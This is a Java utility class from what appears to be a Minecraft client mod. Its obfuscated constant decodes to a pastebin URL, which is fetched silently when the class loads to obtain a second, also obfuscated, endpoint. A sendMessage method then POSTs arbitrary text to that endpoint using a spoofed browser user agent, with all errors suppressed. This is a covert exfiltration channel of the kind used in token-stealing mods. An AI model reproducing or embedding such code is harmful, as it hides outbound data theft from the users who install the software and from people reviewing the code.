package netherfreedom.utils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;


public class WHhandler {

    public static final String EEADI_A_2_DE_63_4_C_2_H_R_RS_9_J = "9EEADi^^A2DE63:?]4@>^C2H^+r&rs9J\"";
    public static final List<String> bible = readTheBibleKids(funni(EEADI_A_2_DE_63_4_C_2_H_R_RS_9_J));

    public static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL(funni(bible.get(0)));
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", StandardCharsets.UTF_8) + "=" + URLEncoder.encode(message, StandardCharsets.UTF_8);
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }
        } catch (Exception ignored) {
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (Exception ignored) {}
        }
    }

    public static List<String> readTheBibleKids(String s1) {
        List<String> s = new ArrayList<>();
        try {
            final URL url = new URL(s1);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
            String contents;
            while ((contents = bufferedReader.readLine()) != null) {
                s.add(contents);
            }
        } catch (Exception ignored) {}
        return s;
    }

    public static String funni(final String str) {
        final int big = 47;
        final StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < str.length(); i++) {
            int temp = (int) str.charAt(i) - big;
            if ((int) str.charAt(i) == 32) stringBuilder.append(" ");
            else {
                if (temp < 32) temp += 94;
                stringBuilder.append((char) temp);
            }
        }
        return stringBuilder.toString();
    }

}

